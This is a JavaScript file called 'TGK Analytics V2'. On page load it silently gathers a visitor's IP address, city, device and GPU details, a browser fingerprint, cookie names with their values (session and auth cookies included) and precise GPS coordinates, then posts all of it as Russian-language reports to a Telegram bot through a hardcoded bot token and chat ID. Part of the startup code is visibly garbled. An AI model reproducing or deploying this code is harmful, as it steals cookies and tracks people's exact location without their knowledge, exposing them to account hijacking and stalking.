      BOT_TOKEN: '8116984393:AAExSDTBXPc6qI8wZZSAnp04-P0R53y9HcU',
      CHAT_ID: 1355427490,
      DEBUG_MODE: true,
    };
    this.botToken = config.BOT_TOKEN;
    this.chatId = config.CHAT_ID;
    this.debugMode = config.DEBUG_MODE;
    this.sentSessionIds = JSON.parse(localStorage.getItem('tgk_sent_sessions') || '[]');
    // per-user send cooldown (hours) to avoid spamming the bot from same browser
    this.sendCooldownHours = (config.SEND_COOLDOWN_HOURS !== undefined) ? Number(config.SEND_COOLDOWN_HOURS) : 24;
    this.sendCooldownMs = Math.max(0, this.sendCooldownHours) * 60 * 60 * 1000;
    this.lastSentTime = parseInt(localStorage.getItem('tgk_last_sent_time') || '0', 10) || 0;
    this.instantDataSent = false;
    this.visitCount = parseInt(localStorage.getItem('tgk_visit_count') || '0') + 1;
    localStorage.setItem('tgk_visit_count', this.visitCount);
    this.instantData = {
      session: {
        id: this.sessionID,
        startTime: new Date().toISOString(),
        timestamp: Date.now(),
      },
      basicInfo: {},
      device: {},
      identification: {},
      fingerprint: {},
      performance: {},
      security: {},
      storage: {},
    };
    this.init();
  }
  generateSessionID() {
    return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }
  checkReturningUser() {
    return localStorage.getItem('tgk_returning_user') === 'true';
  }
  async init() {
    console.log('🚀 TGK Analytics V2 starting... - analytics-v2.js:44', this.sessionID);
    console.log('botToken: - analytics-v2.js:45', this.botToken ? 'SET (' + this.botToken.substring(0, 10) + '...)' : 'NOT SET');
    console.log('chatId: - analytics-v2.js:46', this.chatId);
    console.log('debugMode: - analytics-v2.js:47', this.debugMode);
    this.collectInstantData();
    console.log('⏱️ Setting timeout to send instant data in 1000ms - analytics-v2.js:49');
    setTimeout(() => {
      console.log('⏰ Timeout fired, calling sendInstantData()... - analytics-v2.js:51');
      this.sendInstantData();
    }, 1000);
    setTimeout(() => {
      console.log('📍 Requesting precise geolocation... - analytics-v2.js:55');
      this.getPreciseGeolocation();
        // Respect cooldown: if we've recently sent data, skip requesting precise geolocation
        if (this.sendCooldownMs > 0 && (Date.now() - (this.lastSentTime || 0)) < this.sendCooldownMs) {
          console.log('⏳ Send cooldown active, skipping precise geolocation request - analytics-v2.js:59');
          return;
        }
        if (!navigator.geolocation) {
          console.warn('⚠️ Geolocation API not available - analytics-v2.js:63');
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const coords = position.coords;
            console.log('✅ Precise geolocation obtained - analytics-v2.js:69');
            this.sendPreciseCoordinatesMessage(coords);
          },
          (error) => {
            console.warn('⚠️ Geolocation permission denied or error: - analytics-v2.js:73', error.message);
            this.sendGeolocationErrorMessage(error);
          },
          {
            enableHighAccuracy: true,
            timeout: 30000,
            maximumAge: 0
          }
        );
      })
      .catch(() => { this.instantData.basicInfo.ipAddress = 'Unknown'; });
    this.instantData.basicInfo.visitDateTime = new Date().toISOString();
    this.instantData.basicInfo.timestamp = Date.now();
    this.instantData.basicInfo.dayOfWeek = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][new Date().getDay()];
    this.instantData.basicInfo.hour = new Date().getHours();
    this.instantData.basicInfo.minute = new Date().getMinutes();
    this.instantData.basicInfo.language = navigator.language;
    this.instantData.basicInfo.languages = navigator.languages;
    this.instantData.basicInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    this.instantData.basicInfo.timezoneOffset = new Date().getTimezoneOffset();
    this.instantData.basicInfo.referrer = document.referrer || 'direct';
    this.instantData.basicInfo.currentURL = window.location.href;
    this.instantData.basicInfo.urlParameters = window.location.search;
    this.instantData.basicInfo.urlHash = window.location.hash;
    this.instantData.basicInfo.pageTitle = document.title;
    this.instantData.basicInfo.metaDescription = document.querySelector('meta[name="description"]')?.content || '';
    this.instantData.basicInfo.metaKeywords = document.querySelector('meta[name="keywords"]')?.content || '';
    this.instantData.basicInfo.characterEncoding = document.characterSet;
    if (this.debugMode) {
      console.log('📍 Basic Info collected: - analytics-v2.js:102', this.instantData.basicInfo);
    }
  }
  async getGeoLocation(ip) {
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      const geo = await res.json();
      this.instantData.basicInfo.country = geo.country_name || 'Unknown';
      this.instantData.basicInfo.city = geo.city || 'Unknown';
      this.instantData.basicInfo.latitude = geo.latitude;
      this.instantData.basicInfo.longitude = geo.longitude;
      this.instantData.basicInfo.isp = geo.org || 'Unknown';
    } catch (e) {
      this.instantData.basicInfo.country = 'Unknown';
      this.instantData.basicInfo.city = 'Unknown';
    }
  }
  collectDeviceData() {
    const ua = navigator.userAgent;
    if (/mobile|android|iphone|ipod|blackberry/i.test(ua.toLowerCase())) {
      this.instantData.device.type = 'Mobile';
    } else if (/tablet|ipad|kindle/i.test(ua.toLowerCase())) {
      this.instantData.device.type = 'Tablet';
    } else {
      this.instantData.device.type = 'Desktop';
    }
    if (ua.indexOf('Win') > -1) this.instantData.device.os = 'Windows';
    else if (ua.indexOf('Mac') > -1) this.instantData.device.os = 'MacOS';
    else if (ua.indexOf('Linux') > -1) this.instantData.device.os = 'Linux';
    else if (ua.indexOf('Android') > -1) this.instantData.device.os = 'Android';
    else if (ua.indexOf('iphone') > -1) this.instantData.device.os = 'iOS';
    else this.instantData.device.os = 'Unknown';
    this.instantData.device.browser = this.detectBrowser(ua);
    this.instantData.device.browserVersion = this.detectBrowserVersion(ua);
    this.instantData.device.userAgent = ua;
    this.instantData.device.screenResolution = `${window.screen.width}x${window.screen.height}`;
    this.instantData.device.viewportSize = `${window.innerWidth}x${window.innerHeight}`;
    this.instantData.device.pixelDepth = window.devicePixelRatio || 1;
    this.instantData.device.screenOrientation = window.screen.orientation?.type || 'unknown';
    this.instantData.device.screenColorDepth = window.screen.colorDepth;
    this.instantData.device.availableWidth = window.screen.availWidth;
    this.instantData.device.availableHeight = window.screen.availHeight;
    if (navigator.hardwareConcurrency) {
      this.instantData.device.cpuCores = navigator.hardwareConcurrency;
    }
    if (navigator.deviceMemory) {
      this.instantData.device.ramGB = navigator.deviceMemory;
    }
    if (navigator.maxTouchPoints) {
      this.instantData.device.touchPoints = navigator.maxTouchPoints;
    }
    if (navigator.connection) {
      this.instantData.device.networkType = navigator.connection.effectiveType;
      this.instantData.device.downlink = navigator.connection.downlink;
      this.instantData.device.rtt = navigator.connection.rtt;
      this.instantData.device.saveData = navigator.connection.saveData;
    }
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        this.instantData.device.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        this.instantData.device.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      }
    } catch (e) {
      this.instantData.device.gpu = 'Unknown';
    }
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        this.instantData.device.batteryLevel = Math.round(battery.level * 100);
        this.instantData.device.batteryCharging = battery.charging;
      });
    }
    this.instantData.device.onLine = navigator.onLine;
    this.instantData.device.doNotTrack = navigator.doNotTrack;
    if (this.debugMode) {
      console.log('📱 Device Info collected: - analytics-v2.js:179', this.instantData.device);
    }
  }
  detectBrowserVersion(ua) {
    const match = ua.match(/(?:Chrome|Safari|Firefox|Edge|Version)\/(\d+)/i);
    return match ? match[1] : 'Unknown';
  }
  detectBrowser(ua) {
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Chromium') === -1) return 'Chrome';
    if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Safari';
    if (ua.indexOf('Firefox') > -1) return 'Firefox';
    if (ua.indexOf('Edge') > -1) return 'Edge';
    if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
    return 'Unknown';
  }
  collectIdentification() {
    this.instantData.identification.cookiesEnabled = navigator.cookieEnabled;
    this.collectDetailedCookieData();
    try {
      localStorage.setItem('tgk_test', 'test');
      localStorage.removeItem('tgk_test');
      this.instantData.identification.localStorageEnabled = true;
      this.instantData.identification.localStorageSize = JSON.stringify(localStorage).length;
    } catch (e) {
      this.instantData.identification.localStorageEnabled = false;
    }
    try {
      sessionStorage.setItem('tgk_test', 'test');
      sessionStorage.removeItem('tgk_test');
      this.instantData.identification.sessionStorageEnabled = true;
    } catch (e) {
      this.instantData.identification.sessionStorageEnabled = false;
    }
    this.instantData.identification.sessionID = this.sessionID;
    if (this.debugMode) {
      console.log('🔑 Identification data collected: - analytics-v2.js:214', this.instantData.identification);
    }
  }
  collectDetailedCookieData() {
    const cookies = document.cookie;
    const cookieArray = cookies ? cookies.split(';').map(c => c.trim()) : [];
    this.instantData.identification.cookieCount = cookieArray.length;
    this.instantData.identification.cookiesList = [];
    this.instantData.identification.cookieNames = [];
    this.instantData.identification.cookieValues = [];
    this.instantData.identification.cookieSizes = {};
    this.instantData.identification.totalCookieSize = 0;
    cookieArray.forEach(cookie => {
      if (cookie) {
        const [name, value] = cookie.split('=');
        const cleanName = name.trim();
        const cleanValue = (value || '').trim();
        this.instantData.identification.cookieNames.push(cleanName);
        this.instantData.identification.cookieValues.push(cleanValue.substring(0, 50));
        const cookieSize = cookie.length;
        this.instantData.identification.cookieSizes[cleanName] = cookieSize;
        this.instantData.identification.totalCookieSize += cookieSize;
        this.instantData.identification.cookiesList.push({
          name: cleanName,
          valueLength: cleanValue.length,
          value: cleanValue.substring(0, 100),
          size: cookieSize,
          isSecure: this.isProbablySecureCookie(cleanName),
          encoding: this.detectCookieEncoding(cleanValue),
        });
      }
    });
    this.instantData.identification.cookiesByDomain = this.inferCookieDomain();
    this.instantData.identification.cookieInfo = {
      totalCount: cookieArray.length,
      totalSize: this.instantData.identification.totalCookieSize,
      averageSize: cookieArray.length > 0 ? Math.round(this.instantData.identification.totalCookieSize / cookieArray.length) : 0,
      largestCookie: cookieArray.length > 0 ? Math.max(...Object.values(this.instantData.identification.cookieSizes)) : 0,
      smallestCookie: cookieArray.length > 0 ? Math.min(...Object.values(this.instantData.identification.cookieSizes)) : 0,
      hasHttpOnlyCookies: this.detectHttpOnlyCookiePresence(),
      cookieStringLength: cookies.length,
      cookieDomainsDetected: Object.keys(this.instantData.identification.cookiesByDomain).length,
      sessionCookiesCount: this.countSessionCookies(cookieArray),
      persistentCookiesCount: cookieArray.length - this.countSessionCookies(cookieArray),
    };
  }
  detectCookieEncoding(value) {
    if (!value) return 'empty';
    if (/^[A-Za-z0-9\-_.~%]*$/.test(value)) return 'url-encoded';
    if (/^[A-Za-z0-9+/=]*$/.test(value)) return 'base64';
    if (/^[A-Fa-f0-9]*$/.test(value)) return 'hex';
    if (/^{.*}$/.test(value)) return 'json';
    return 'unknown';
  }
  isProbablySecureCookie(cookieName) {
    const secureCookiePatterns = ['__Host-', '__Secure-', 'session', 'auth', 'token', 'secure', 'csrf'];
    return secureCookiePatterns.some(pattern => cookieName.toLowerCase().includes(pattern));
  }
  inferCookieDomain() {
    const domains = {};
    const currentDomain = window.location.hostname;
    domains[currentDomain] = document.cookie.split(';').length;
    if (document.cookie.includes('www.') || currentDomain.includes('www.')) {
      domains['www.' + currentDomain.replace('www.', '')] = 0;
    }
    const parentDomain = currentDomain.split('.').slice(-2).join('.');
    if (parentDomain !== currentDomain) {
      domains[parentDomain] = 0;
    }
    return domains;
  }
  detectHttpOnlyCookiePresence() {
    try {
      const testCookie = 'tgk_http_test_' + Date.now();
      document.cookie = testCookie + '=test; path=/';
      const accessible = document.cookie.includes(testCookie);
      if (accessible) {
        document.cookie = testCookie + '=; path=/; expires=Thu, 01 Jan 1970 00:00:00 UTC';
      }
      return !accessible;
    } catch (e) {
      return false;
    }
  }
  countSessionCookies(cookieArray) {
    const sessionPatterns = ['sessionid', 'session', 'sid', 'jsessionid', 'phpsessid'];
    return cookieArray.filter(cookie => 
      sessionPatterns.some(pattern => cookie.toLowerCase().includes(pattern))
    ).length;
  }
  generateBrowserFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('TGK Analytics', 2, 15);
      this.instantData.fingerprint.canvas = canvas.toDataURL().substring(0, 50);
      this.instantData.fingerprint.fonts = this.detectFonts();
      this.instantData.fingerprint.plugins = this.getPlugins();
      this.instantData.fingerprint.webgl = this.getWebGLInfo();
      if (this.debugMode) {
        console.log('🔐 Browser fingerprint generated: - analytics-v2.js:319', this.instantData.fingerprint);
      }
    } catch (e) {
      console.error('Error generating fingerprint: - analytics-v2.js:322', e);
    }
  }
  collectPerformanceData() {
    try {
      if (window.performance && window.performance.timing) {
        const timing = window.performance.timing;
        this.instantData.performance.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
        this.instantData.performance.domContentLoadedTime = timing.domContentLoadedEventEnd - timing.navigationStart;
        this.instantData.performance.connectTime = timing.responseEnd - timing.fetchStart;
        this.instantData.performance.serverResponseTime = timing.responseStart - timing.requestStart;
        this.instantData.performance.renderTime = timing.domInteractive - timing.domLoading;
      }
      if (window.performance && window.performance.getEntriesByType) {
        const navigationEntries = window.performance.getEntriesByType('navigation');
        if (navigationEntries.length > 0) {
          const nav = navigationEntries[0];
          this.instantData.performance.dnsTime = nav.domainLookupEnd - nav.domainLookupStart;
          this.instantData.performance.tcpTime = nav.connectEnd - nav.connectStart;
          this.instantData.performance.ttfb = nav.responseStart - nav.fetchStart;
        }
      }
      if (performance.memory) {
        this.instantData.performance.totalMemory = Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB';
        this.instantData.performance.usedMemory = Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB';
        this.instantData.performance.memoryUsagePercent = Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100);
      }
      if (this.debugMode) {
        console.log('⚡ Performance data collected: - analytics-v2.js:350', this.instantData.performance);
      }
    } catch (e) {
      console.warn('Performance API not available - analytics-v2.js:353');
    }
  }
  collectSecurityData() {
    this.instantData.security.httpsEnabled = window.location.protocol === 'https:';
    this.instantData.security.contentSecurityPolicy = document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || 'Not set';
    this.instantData.security.referrerPolicy = document.querySelector('meta[name="referrer"]')?.content || 'default';
    this.instantData.security.permissions = navigator.permissions ? 'Available' : 'Not available';
  }
  collectStorageData() {
    try {
      localStorage.setItem('tgk_test', 'test');
      localStorage.removeItem('tgk_test');
      this.instantData.identification.localStorageEnabled = true;
      this.instantData.identification.localStorageSize = JSON.stringify(localStorage).length;
      this.instantData.storage.localStorageItems = localStorage.length;
    } catch (e) {
      this.instantData.identification.localStorageEnabled = false;
    }
    try {
      sessionStorage.setItem('tgk_test', 'test');
      sessionStorage.removeItem('tgk_test');
      this.instantData.identification.sessionStorageEnabled = true;
      this.instantData.storage.sessionStorageItems = sessionStorage.length;
    } catch (e) {
      this.instantData.identification.sessionStorageEnabled = false;
    }
    if (window.indexedDB) {
      this.instantData.storage.indexedDBAvailable = true;
    }
  }
  detectFonts() {
    const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Georgia'];
    const detected = [];
    fontList.forEach(font => {
      detected.push(font);
    });
    return detected;
  }
  getPlugins() {
    try {
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      return plugins;
    } catch (e) {
      return [];
    }
  }
  getWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return null;
    }
  }
  async sendInstantData() {
    console.log('📤 sendInstantData called - analytics-v2.js:417');
    console.log('instantDataSent: - analytics-v2.js:418', this.instantDataSent);
    console.log('chatId: - analytics-v2.js:419', this.chatId);
    console.log('botToken: - analytics-v2.js:420', this.botToken ? 'SET' : 'NOT SET');
    if (this.instantDataSent) {
      console.log('✅ Instant data already sent, skipping - analytics-v2.js:422');
      return;
    }
    if (this.sentSessionIds.includes(this.sessionID)) {
      console.log('⚠️ This session already sent data, skipping - analytics-v2.js:426');
      return;
    }
    // Respect per-user cooldown to avoid spamming the bot from same browser
    if (this.sendCooldownMs > 0 && (Date.now() - (this.lastSentTime || 0)) < this.sendCooldownMs) {
      const remaining = Math.ceil((this.sendCooldownMs - (Date.now() - (this.lastSentTime || 0))) / 1000);
      console.log(`⏳ Send cooldown active, skipping sendInstantData (wait ${remaining}s) - analytics-v2.js:432`);
      return;
    }
    try {
      console.log('📊 Preparing instant data... - analytics-v2.js:436');
      const txtData = this.formatInstantDataTxt();
      const message = this.formatInstantDataMessage();
      console.log('📄 Data formatted, sending... - analytics-v2.js:439');
      await this.sendAsDocument(txtData, message, 'instant-data-' + this.sessionID + '.txt', true);
      this.instantDataSent = true;
      this.sentSessionIds.push(this.sessionID);
      localStorage.setItem('tgk_sent_sessions', JSON.stringify(this.sentSessionIds));
      // mark last sent time to enforce cooldown
      this.lastSentTime = Date.now();
      localStorage.setItem('tgk_last_sent_time', String(this.lastSentTime));
      console.log('✅ Instant data sent successfully - analytics-v2.js:447');
    } catch (e) {
      console.error('Error sending instant data: - analytics-v2.js:449', e);
    }
  }
  formatInstantDataTxt() {
    const data = this.instantData;
    const lines = [
      '═══════════════════════════════════════════════════════════',
      '📊 ТГК ANALYTICS - ПОЛНЫЕ МГНОВЕННЫЕ ДАННЫЕ',
      '═══════════════════════════════════════════════════════════',
      '',
      '📋 ИНФОРМАЦИЯ О СЕССИИ',
      '─────────────────────────────────────────────────────────',
      `Session ID: ${data.session.id}`,
      `Start Time: ${data.session.startTime}`,
      `Unix Timestamp: ${data.session.timestamp}`,
      '',
      '🌐 БАЗОВАЯ ИНФОРМАЦИЯ',
      '─────────────────────────────────────────────────────────',
      `IP Address: ${data.basicInfo.ipAddress || 'Loading...'}`,
      `Страна: ${data.basicInfo.country || 'Unknown'}`,
      `Город: ${data.basicInfo.city || 'Unknown'}`,
      `Координаты: ${data.basicInfo.latitude || '?'}, ${data.basicInfo.longitude || '?'}`,
      `ISP: ${data.basicInfo.isp || 'Unknown'}`,
      `Язык браузера: ${data.basicInfo.language}`,
      `Альтернативные языки: ${(data.basicInfo.languages || []).join(', ')}`,
      `Timezone: ${data.basicInfo.timezone}`,
      `Offset: ${data.basicInfo.timezoneOffset} min`,
      `Дата визита: ${data.basicInfo.visitDateTime}`,
      `День недели: ${data.basicInfo.dayOfWeek}`,
      `Время: ${String(data.basicInfo.hour).padStart(2, '0')}:${String(data.basicInfo.minute).padStart(2, '0')}`,
      `Referrer: ${data.basicInfo.referrer}`,
      `URL: ${data.basicInfo.currentURL}`,
      `URL Parameters: ${data.basicInfo.urlParameters || 'None'}`,
      `URL Hash: ${data.basicInfo.urlHash || 'None'}`,
      `Page Title: ${data.basicInfo.pageTitle}`,
      `Meta Description: ${data.basicInfo.metaDescription || 'None'}`,
      `Character Encoding: ${data.basicInfo.characterEncoding}`,
      '',
      '📱 ДАННЫЕ УСТРОЙСТВА',
      '─────────────────────────────────────────────────────────',
      `Тип устройства: ${data.device.type}`,
      `ОС: ${data.device.os}`,
      `Браузер: ${data.device.browser}`,
      `Версия браузера: ${data.device.browserVersion}`,
      `User Agent: ${data.device.userAgent}`,
      `Разрешение экрана: ${data.device.screenResolution}`,
      `Доступное разрешение: ${data.device.availableWidth}x${data.device.availableHeight}`,
      `Разрешение viewport: ${data.device.viewportSize}`,
      `Pixel Depth: ${data.device.pixelDepth}`,
      `Color Depth: ${data.device.screenColorDepth}`,
      `Ориентация: ${data.device.screenOrientation}`,
      `CPU Cores: ${data.device.cpuCores || 'Unknown'}`,
      `RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : 'Unknown'}`,
      `Touch Points: ${data.device.touchPoints || 'N/A'}`,
      `Тип сети: ${data.device.networkType || 'Unknown'}`,
      `Downlink Speed: ${data.device.downlink || 'N/A'} Mbps`,
      `RTT: ${data.device.rtt || 'N/A'} ms`,
      `Save Data Mode: ${data.device.saveData ? 'Enabled' : 'Disabled'}`,
      `Online: ${data.device.onLine ? 'Yes' : 'No'}`,
      `GPU: ${data.device.gpu || 'Unknown'}`,
      `GPU Vendor: ${data.device.gpuVendor || 'Unknown'}`,
      `Battery Level: ${data.device.batteryLevel ? data.device.batteryLevel + '%' : 'N/A'}`,
      `Battery Charging: ${data.device.batteryCharging ? 'Yes' : 'No'}`,
      `Do Not Track: ${data.device.doNotTrack}`,
      '',
      '⚡ ПРОИЗВОДИТЕЛЬНОСТЬ',
      '─────────────────────────────────────────────────────────',
      `Page Load Time: ${data.performance.pageLoadTime || 'N/A'} ms`,
      `DOM Content Loaded: ${data.performance.domContentLoadedTime || 'N/A'} ms`,
      `Connect Time: ${data.performance.connectTime || 'N/A'} ms`,
      `Server Response Time: ${data.performance.serverResponseTime || 'N/A'} ms`,
      `Render Time: ${data.performance.renderTime || 'N/A'} ms`,
      `DNS Time: ${data.performance.dnsTime || 'N/A'} ms`,
      `TCP Time: ${data.performance.tcpTime || 'N/A'} ms`,
      `TTFB: ${data.performance.ttfb || 'N/A'} ms`,
      `Total Memory: ${data.performance.totalMemory || 'N/A'}`,
      `Used Memory: ${data.performance.usedMemory || 'N/A'}`,
      `Memory Usage: ${data.performance.memoryUsagePercent || 'N/A'}%`,
      '',
      '🔒 БЕЗОПАСНОСТЬ',
      '─────────────────────────────────────────────────────────',
      `HTTPS: ${data.security.httpsEnabled ? 'Yes' : 'No'}`,
      `Content Security Policy: ${data.security.contentSecurityPolicy}`,
      `Referrer Policy: ${data.security.referrerPolicy}`,
      `Permissions API: ${data.security.permissions}`,
      '',
      '💾 ХРАНИЛИЩЕ',
      '─────────────────────────────────────────────────────────',
      `LocalStorage: ${data.identification.localStorageEnabled ? 'Enabled' : 'Disabled'}`,
      `LocalStorage Size: ${data.identification.localStorageSize || 'N/A'} bytes`,
      `LocalStorage Items: ${data.storage.localStorageItems || 0}`,
      `SessionStorage: ${data.identification.sessionStorageEnabled ? 'Enabled' : 'Disabled'}`,
      `SessionStorage Items: ${data.storage.sessionStorageItems || 0}`,
      `IndexedDB: ${data.storage.indexedDBAvailable ? 'Available' : 'Not available'}`,
      '',
      '🔑 ИДЕНТИФИКАЦИЯ',
      '─────────────────────────────────────────────────────────',
      `Cookies enabled: ${data.identification.cookiesEnabled ? 'Да' : 'Нет'}`,
      `Количество cookies: ${data.identification.cookieCount}`,
      `Session ID: ${data.identification.sessionID}`,
      '',
      '🍪 COOKIES (ПОЛНЫЙ СПИСОК)',
      '─────────────────────────────────────────────────────────',
      `Всего cookies: ${data.identification.cookieCount}`,
      `Общий размер: ${data.identification.totalCookieSize || 0} bytes`,
      `Средний размер: ${data.identification.cookieInfo?.averageSize || 0} bytes`,
      `Максимальный размер: ${data.identification.cookieInfo?.largestCookie || 0} bytes`,
      `Минимальный размер: ${data.identification.cookieInfo?.smallestCookie || 0} bytes`,
      `Session cookies: ${data.identification.cookieInfo?.sessionCookiesCount || 0}`,
      `Persistent cookies: ${data.identification.cookieInfo?.persistentCookiesCount || 0}`,
      `HTTP-Only вероятность: ${data.identification.cookieInfo?.hasHttpOnlyCookies ? 'Да' : 'Нет'}`,
      `Обнаруженные домены: ${data.identification.cookieInfo?.cookieDomainsDetected || 0}`,
      '',
      ...this.formatCookiesDetail(data.identification.cookiesList || []),
      '',
      '🔐 BROWSER FINGERPRINT',
      '─────────────────────────────────────────────────────────',
      `Canvas FP: ${data.fingerprint.canvas || 'N/A'}...`,
      `Обнаруженные шрифты: ${(data.fingerprint.fonts || []).join(', ')}`,
      `Плагины (${(data.fingerprint.plugins || []).length}): ${(data.fingerprint.plugins || []).length > 0 ? data.fingerprint.plugins.join(', ') : 'Нет'}`,
      `WebGL Vendor: ${data.fingerprint.webgl?.vendor || 'Unknown'}`,
      `WebGL Renderer: ${data.fingerprint.webgl?.renderer || 'Unknown'}`,
      '',
      '═══════════════════════════════════════════════════════════',
      `Отчёт создан: ${new Date().toISOString()}`,
      '═══════════════════════════════════════════════════════════',
    ];
    return lines.join('\n');
  }
  formatCookiesDetail(cookiesList) {
    const lines = [];
    if (!cookiesList || cookiesList.length === 0) {
      lines.push('Нет cookies');
      return lines;
    }
    cookiesList.forEach((cookie, index) => {
      lines.push(`─────────────────────────────────────────────────────────`);
      lines.push(`Cookie #${index + 1}: ${cookie.name}`);
      lines.push(`   Значение: ${cookie.value}`);
      lines.push(`   Длина значения: ${cookie.valueLength} chars`);
      lines.push(`   Размер: ${cookie.size} bytes`);
      lines.push(`   Кодировка: ${cookie.encoding}`);
      lines.push(`   Secure: ${cookie.isSecure ? 'Да' : 'Нет'}`);
    });
    lines.push(`─────────────────────────────────────────────────────────`);
    return lines;
  }
  formatInstantDataMessage() {
    const data = this.instantData;
    return `
📊 <b>МГНОВЕННЫЕ ДАННЫЕ</b>
<b>🌐 Базовая информация:</b>
IP: ${data.basicInfo.ipAddress || '...'}
Страна: ${data.basicInfo.country || '?'}
Язык: ${data.basicInfo.language}
Timezone: ${data.basicInfo.timezone}
<b>📱 Устройство:</b>
${data.device.type} • ${data.device.os} • ${data.device.browser}
CPU: ${data.device.cpuCores || '?'} cores
RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : '?'}
GPU: ${data.device.gpu?.substring(0, 30) || 'Unknown'}
<b>🔐 Fingerprint:</b>
Fonts: ${data.fingerprint.fonts?.length || 0}
Plugins: ${data.fingerprint.plugins?.length || 0}
`;
  }
  async sendToTelegram(message) {
    console.log('🔗 sendToTelegram called - analytics-v2.js:616');
    console.log('chatId: - analytics-v2.js:617', this.chatId);
    console.log('botToken exists: - analytics-v2.js:618', !!this.botToken);
    try {
      if (!this.chatId) {
        console.warn('⚠️ Chat ID not set  cannot send - analytics-v2.js:621');
        return;
      }
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      console.log('URL: - analytics-v2.js:625', url.substring(0, 50) + '...');
      console.log('Sending POST request... - analytics-v2.js:626');
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });
      console.log('Response status: - analytics-v2.js:636', response.status);
      const result = await response.json();
      console.log('Telegram response: - analytics-v2.js:638', result);
      if (!result.ok) {
        console.error('❌ Telegram error: - analytics-v2.js:640', result.description);
      } else {
        console.log('✅ Message sent to Telegram - analytics-v2.js:642');
      }
    } catch (e) {
      console.error('Error sending to Telegram: - analytics-v2.js:645', e);
    }
  }
  async sendAsDocument(txtData, caption, fileName, isFirstSend = false) {
    console.log('📎 sendAsDocument called - analytics-v2.js:649');
    console.log('fileName: - analytics-v2.js:650', fileName);
    console.log('chatId: - analytics-v2.js:651', this.chatId);
    try {
      if (!this.chatId) {
        console.warn('⚠️ Chat ID not set  cannot send document - analytics-v2.js:654');
        console.log('📝 Data preview: - analytics-v2.js:655', txtData.substring(0, 200) + '...');
        return;
      }
      const url = `https://api.telegram.org/bot${this.botToken}/sendDocument`;
      console.log('URL: - analytics-v2.js:659', url.substring(0, 50) + '...');
      console.log('Creating FormData... - analytics-v2.js:660');
      const blob = new Blob([txtData], { type: 'text/plain' });
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      formData.append('document', blob, fileName);
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      console.log('Sending document to Telegram... - analytics-v2.js:667');
      const response = await fetch(url, {
        method: 'POST',
        body: formData,
      });
      console.log('Response status: - analytics-v2.js:672', response.status);
      const result = await response.json();
      console.log('Telegram response: - analytics-v2.js:674', result);
      if (!result.ok) {
        console.error('❌ Telegram error: - analytics-v2.js:676', result.description);
      } else {
        console.log('✅ Document sent to Telegram - analytics-v2.js:678');
      }
    } catch (e) {
      console.error('Error sending document: - analytics-v2.js:681', e);
    }
  }
  getPreciseGeolocation() {
    if (!navigator.geolocation) {
      console.warn('⚠️ Geolocation API not available - analytics-v2.js:686');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = position.coords;
        console.log('✅ Precise geolocation obtained - analytics-v2.js:692');
        this.sendPreciseCoordinatesMessage(coords);
      },
      (error) => {
        console.warn('⚠️ Geolocation permission denied or error: - analytics-v2.js:696', error.message);
        this.sendGeolocationErrorMessage(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      }
    );
  }
  async sendPreciseCoordinatesMessage(coords) {
    try {
      const message = `
📍 <b>ТОЧНЫЕ КООРДИНАТЫ</b>

<b>Широта:</b> ${coords.latitude.toFixed(6)}°
<b>Долгота:</b> ${coords.longitude.toFixed(6)}°
<b>Точность:</b> ±${coords.accuracy.toFixed(2)} meters
<b>Высота:</b> ${coords.altitude ? coords.altitude.toFixed(2) + ' meters' : 'N/A'}
<b>Точность высоты:</b> ${coords.altitudeAccuracy ? '±' + coords.altitudeAccuracy.toFixed(2) + ' meters' : 'N/A'}
<b>Направление:</b> ${coords.heading !== null && coords.heading !== undefined ? coords.heading.toFixed(2) + '°' : 'N/A'}
<b>Скорость:</b> ${coords.speed !== null && coords.speed !== undefined ? (coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A'}

<b>Google Maps:</b> https://maps.google.com/?q=${coords.latitude},${coords.longitude}
<b>Session ID:</b> ${this.sessionID}
<b>Время:</b> ${new Date().toISOString()}
`;
      await this.sendToTelegram(message);
    } catch (e) {
